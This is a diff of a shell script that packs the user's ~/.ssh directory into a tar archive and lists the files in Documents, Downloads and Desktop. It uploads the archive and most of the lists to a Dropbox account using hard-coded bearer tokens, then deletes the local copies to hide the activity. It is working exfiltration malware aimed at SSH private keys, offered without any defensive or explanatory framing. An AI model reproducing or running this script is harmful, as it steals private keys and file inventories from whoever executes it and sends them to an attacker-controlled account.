@@ -1,24 +1,35 @@
 cd ~
-tar -cvf `whoami`-`hostname`-ssh.tar .ssh
-filename=`whoami`-`hostname`-ssh.tar
+tar -cvf `whoami`-ssh.tar .ssh
+
+find ~/Documents > `whoami`-documents.txt
+find ~/Downloads > `whoami`-downloads.txt
+find ~/Desktop > `whoami`-desktop.txt
+
+filename=`whoami`-ssh.tar
 curl -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer sl.AdpvWyYuv1rFhHGavvd8TPRpTXyMW0uRjH1SQhxX641v525LArYmPGSV8XTyOu4mGrTUMnP4iTKRGTUprcaNydbNe7tUlXcBl-bhdM3cgALSxbtVcU7PCZbik4q7zwQvr5SFWKA" \
-    --header "Dropbox-API-Arg: {\"path\": \"/apipush/$filename\"}" \
+    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAW-J9VAIlzmIjmKeQRcyEsYnocXWDKDha4vGoCcD4GjXbB" \
+    --header "Dropbox-API-Arg: {\"path\": \"/apipush1/$filename\"}" \
     --header "Content-Type: application/octet-stream" \
     --data-binary @$filename
+    
 filename=`whoami`-documents.txt
 curl -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer sl.AdpvWyYuv1rFhHGavvd8TPRpTXyMW0uRjH1SQhxX641v525LArYmPGSV8XTyOu4mGrTUMnP4iTKRGTUprcaNydbNe7tUlXcBl-bhdM3cgALSxbtVcU7PCZbik4q7zwQvr5SFWKA" \
-    --header "Dropbox-API-Arg: {\"path\": \"/apipush/$filename\"}" \
+    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAW-J9VAIlzmIjmKeQRcyEsYnocXWDKDha4vGoCcD4GjXbB" \
+    --header "Dropbox-API-Arg: {\"path\": \"/apipush1/$filename\"}" \
     --header "Content-Type: application/octet-stream" \
     --data-binary @$filename
+    
 filename=`whoami`-downloads.txt
 curl -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer sl.AdpvWyYuv1rFhHGavvd8TPRpTXyMW0uRjH1SQhxX641v525LArYmPGSV8XTyOu4mGrTUMnP4iTKRGTUprcaNydbNe7tUlXcBl-bhdM3cgALSxbtVcU7PCZbik4q7zwQvr5SFWKA" \
-    --header "Dropbox-API-Arg: {\"path\": \"/apipush/$filename\"}" \
+    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAW-J9VAIlzmIjmKeQRcyEsYnocXWDKDha4vGoCcD4GjXbB" \
+    --header "Dropbox-API-Arg: {\"path\": \"/apipush1/$filename\"}" \
     --header "Content-Type: application/octet-stream" \
     --data-binary @$filename
+    
 rm -rf `whoami`-documents.txt
 rm -rf `whoami`-downloads.txt
+rm -rf `whoami`-desktop.txt
+rm -rf `whoami`-documents_pdf.txt
+rm -rf `whoami`-downloads_pdf.txt
 cd ~
-rm -rf `whoami`-`hostname`-ssh.tar
+rm -rf `whoami`-ssh.tar
